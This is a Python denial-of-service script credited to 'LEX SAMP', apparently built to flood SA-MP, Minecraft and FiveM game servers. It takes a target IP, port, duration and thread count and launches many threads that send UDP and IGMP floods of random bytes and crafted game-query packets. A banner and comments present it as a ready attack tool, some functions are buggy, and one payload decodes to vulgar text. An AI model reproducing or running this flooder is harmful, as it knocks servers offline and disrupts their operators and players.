#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#------------[ CREDITS TOOLS ]------------#
#SINCE : 25-07-2022
#UPDATE AT : 11-07-2023
#UPDATE BY : LEX SAMP
#----------------[ ALL IMPORT ]----------------#
import os, socket, struct, codecs, sys, threading, random, time, requests

#-------[ ALL SETTINGS ]-------#
ip = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4]) #500
fake_ip = 'www.youtube.com'
yip = requests.get('https://api.ipify.org').text.strip()
dname = socket.gethostname()

waktu_skrg = int(time.time()) + int(times)

#-------[ EXPLOIT SETTINGS ]-------#
with open('ips.txt', 'r') as f:
    ips = f.readlines()

host = socket.gethostbyname(ip)
#---------------------[ LEX CODE ]---------------------#
Randomlex = [
 b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00',
 b'SAMP\x958\xe1\xa9a\x1ec',
 b'SAMP\x958\xe1\xa9a\x1ei',
 b'SAMP\x958\xe1\xa9a\x1er',
 b'SAMP\x958\xe1\xa9a\x1ev',
 b'SAMP\x958\xe1\xa9a\x1eg',
 b'\x08\x1eb\xda',
 b'\x08\x1eb\xda',
 b'\x02\x1e\xfdS',
 b'\x08\x1eM\xda',
 b'\x02\x1e\xfd@',
 b'\x08\x1e~\xda'
 ]

Lexhex = [
 b'/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A',
 b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67',
 b'\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54',
 b'\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff',
 b'\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45'    
]
#--------------[ INFO TOOLS ]--------------#
usr = "LEX SAMP"
 
prot = (random.randint(0,3))
sys.stdout.write("\x1b]2;[-] ULTRAS | Online User : [{}] | Running Attack [1] | Api Connected [0] | Admin : [LEX SA-MP] | Username : @{}\x07".format (prot,usr))

#--------------[ BASIC LOGIN ]--------------#
#for i in range(3):
#    us = input("User Name : ")
#    j = 3
#    if (us == usr):
#        time.sleep(2)
#        print("[BOT] Processing\n")
#        time.sleep(3)
#        break
#    else:
#        time.sleep(2)
#        print("\033[31mUnknown user in databes [users]. dm my owner for check your account\n")
#        continue
#time.sleep(2)
#print("\033[31mSuccesfull Logins")
#time.sleep(2)

#--------------[ PEMANIS ]--------------#
#os.system("clear")
#print ("\033[33mYou device name : [\033[31m{}033[33m]"%(dname))
#print ("\033[33mYou ip : \033[31m{}"%(yip))
#time.sleep(2)

os.system("clear")
#---------------------[ BANNER'S ]---------------------
print(f"""


\033[38;5;63m                    ╔════════════════════════════════════════╗
                              \033[38;5;208m╦  ╔═╗═╗ ╦  ╔═╗╔═╗╔╦╗╔═╗       
                              \033[38;5;181m║  ║╣ ╔╩╦╝  ╚═╗╠═╣║║║╠═╝       
                              \033[38;5;208m╩═╝╚═╝╩ ╚═  ╚═╝╩ ╩╩ ╩╩
\033[38;5;63m                    ╚═══╦════════════════════════════════╦═══╝
\033[38;5;63m                        ║      \033[0mSUBSCRIBE  @LEX SAMP      \033[38;5;63m║
\033[38;5;63m                ╔═══════╩════════════════════════════════╩════════╗
\033[38;5;63m                   [\033[0m•\033[38;5;63m] \033[38;5;208mIP SERVER   \033[38;5;63m         [\033[0m•\033[38;5;63m] \033[38;5;208m{host}\033[0m:\033[38;5;208m{port}
\033[38;5;63m                   [\033[0m•\033[38;5;63m] \033[38;5;208mTIME   \033[38;5;63m              [\033[0m•\033[38;5;63m] \033[38;5;208m{times}
\033[38;5;63m                   [\033[0m•\033[38;5;63m] \033[38;5;208mMETHODS   \033[38;5;63m           [\033[0m•\033[38;5;63m] \033[38;5;208mEXPLOIT
\033[38;5;63m                ╚════╦══════════════════════════════════════╦═════╝
\033[38;5;63m                  ═══╩══════════════════════════════════════╩═══
\033[0m

""")
#print ("\033[35m[BOT] \033[32m• \033[33mYOU ATTACK HAS LAUNCHED TO IP \033[31m%s \033[32mAND PORT \033[31m%s"%(host,port))

#--------------[ DEF SEND ATTACK ]--------------
def send_attack():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1081) #1081
	packets = random._urandom(1021)
	pack = random._urandom(999)
	msg = Randomlex[random.randrange(0, 3)]
	pay = b'\x08\x1eb\xda'
	while int(time.time()) < waktu_skrg:
		s.sendto(Lexhex[0], (host, int(port)))
		s.sendto(bytes, (host, int(port)))
		s.sendto(packets, (host, int(port)))
		s.sendto(pack, (host, int(port)))
		s.sendto(msg, (host, int(port)))
		s.sendto(pay, (host, int(port)))
		s.sendto(Randomlex[0], (host, int(port)))

def randsender():
	s = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
	punch = random._urandom(int(1024))
	while int(time.time()) < waktu_skrg:
	    s.sendto(punch, (host, int(port)))
	    s.sendto(punch, (host, int(port)))
	    s.sendto(punch, (host, int(port)))

def send_attacks():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	size = random._urandom(15000)
	pack = random._urandom(999)
	pay = b'\x08\x1eb\xda'
	while int(time.time()) < waktu_skrg:
	    s.sendto(size, (host, int(port)))
	    s.sendto(pack, (host, int(port)))
	    s.sendto(pay, (host, int(port)))
	    s.sendto(Lexhex[0], (host, int(port)))
	    s.sendto(Randomlex[0], (host, int(port)))
	    s.sendto(Randomlex[7], (host, int(port)))
	    s.sendto(Randomlex[8], (host, int(port)))
	    s.sendto(Randomlex[7], (host, int(port)))
	    s.sendto(Randomlex[8], (host, int(port)))
	    s.sendto(Randomlex[7], (host, int(port)))
	    s.sendto(Randomlex[8], (host, int(port)))
	    s.sendto(Randomlex[10], (host, int(port)))
	    s.sendto(Randomlex[11], (host, int(port)))

def send_old():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
	s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65508)
	s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_TTL, 20)
	s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_LOOP, 1)
	bytes = random._urandom(65507)
	pack = random._urandom(666)
	msg = Randomlex[random.randrange(0, 1)]
	while int(time.time()) < waktu_skrg:
	    s.sendto(bytes, (host, int(port)))
	    s.sendto(pack, (host, int(port)))
	    s.sendto(msg, (host, int(port)))
	    s.sendto(Lexhex[0], (host, int(port)))
	    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (host, int(port)))
	    if int(port) == 7777:
	        s.sendto(Randomlex[7], (host, int(port)))
	        s.sendto(Randomlex[8], (host, int(port)))
	        s.sendto(Randomlex[0], (host, int(port)))
	    elif int(port) == 7776:
	        s.sendto(Randomlex[7], (host, int(port)))
	        s.sendto(Randomlex[8], (host, int(port)))
	    elif int(port) == 7771:
	        s.sendto(Randomlex[6], (host, int(port)))
	        s.sendto(Randomlex[8], (host, int(port)))
	    elif int(port) == 7784:
	        s.sendto(Randomlex[7], (host, int(port)))
	        s.sendto(Randomlex[0], (host, int(port)))

#--------------[ SEND WITH PAYLOAD ]--------------#
def send_udp():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	hpayload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
	le = b'\x00\x00\x00\x00\x00\x01\x00\x00'
	payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	pay = b'\x08\x1eb\xda'
	while int(time.time()) < waktu_skrg:
		s.sendto(Randomlex[0], (host, int(port)))
		s.sendto(le, (host, int(port)))
		s.sendto(pay, (host, int(port)))
		s.sendto(hpayload, (host, int(port)))
		s.sendto(payload, (host, int(port)))
		s.sendto(Lexhex[0], (host, int(port)))
		s.sendto(Randomlex[7], (host, int(port)))
		s.sendto(Randomlex[8], (host, int(port)))
		s.sendto(Randomlex[7], (host, int(port)))
		s.sendto(Randomlex[8], (host, int(port)))
		s.sendto(Randomlex[7], (host, int(port)))
		s.sendto(Randomlex[8], (host, int(port)))

#--------------[ SEND WITH UDP EXPLOIT ]--------------#
def send_udpex():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	buf = 2048
	le = b'\x00\x00\x00\x00\x00\x01\x00\x00'
	pay = b'\x08\x1eb\xda'
	pe = b'\x00\x00\x00\x00\x00\x01\x00\x00'
	bytes = random._urandom(600000)
	while int(time.time()) < waktu_skrg:
	    data, addr = s.recvfrom(buf)
	    s.sendto(buf, (host, int(port)))
	    s.sendto(Randomlex[0], (host, int(port)))
	    s.sendto(le, (host, int(port)))
	    s.sendto(pay, (host, int(port)))
	    s.sendto(bytes, (host, int(port)))
	    s.sendto(Lexhex[0], (host, int(port)))
	    s.sendto(pe, (host, int(port)))

#--------------[ SEND WITH MC EXPLOIT ]--------------#
def send_mchex():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.SOCK_STREAM)
	le = b'\x00\x00\x00\x00\x00\x01\x00\x00'
	pay = b'\x08\x1eb\xda'
	pe = b'\x00\x00\x00\x00\x00\x01\x00\x00'
	mce = b'\x00'
	payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
	bytes = random._urandom(600000)
	while int(time.time()) < waktu_skrg:
	    s.sendto(Randomlex[0], (host, int(port)))
	    s.sendto(le, (host, int(port)))
	    s.sendto(pay, (host, int(port)))
	    s.sendto(bytes, (host, int(port)))
	    s.sendto(Lexhex[0], (host, int(port)))
	    s.sendto(pe, (host, int(port)))
	    s.sendto(mce, (host, int(port)))
	    s.sendto(payload, (host, int(port)))

#--------------[ SEND WITH FIVEM EXPLOIT ]--------------#
def send_fivemhex():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	size = random._urandom(15000)
	pack = random._urandom(999)
	pay = b'\x08\x1eb\xda'
	payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
	while int(time.time()) < waktu_skrg:
	    s.sendto(size, (host, int(port)))
	    s.sendto(pack, (host, int(port)))
	    s.sendto(pay, (host, int(port)))
	    s.sendto(payload, (host, int(port)))
	    s.sendto(Lexhex[0], (host, int(port)))
	    s.sendto(Randomlex[0], (host, int(port)))
	    s.sendto(Randomlex[7], (host, int(port)))
	    s.sendto(Randomlex[8], (host, int(port)))
	    s.sendto(Randomlex[7], (host, int(port)))
	    s.sendto(Randomlex[8], (host, int(port)))
	    s.sendto(Randomlex[7], (host, int(port)))
	    s.sendto(Randomlex[8], (host, int(port)))
	    s.sendto(Randomlex[10], (host, int(port)))
	    s.sendto(Randomlex[11], (host, int(port)))

#--------------[ START DDOS BY LEXYY ]--------------#
for _ in range(threads):
	threading.Thread(target = send_attack).start()
	threading.Thread(target = randsender).start()
	threading.Thread(target = send_attacks).start()
	threading.Thread(target = send_old).start()
	threading.Thread(target = send_udp).start()
	threading.Thread(target = send_udpex).start()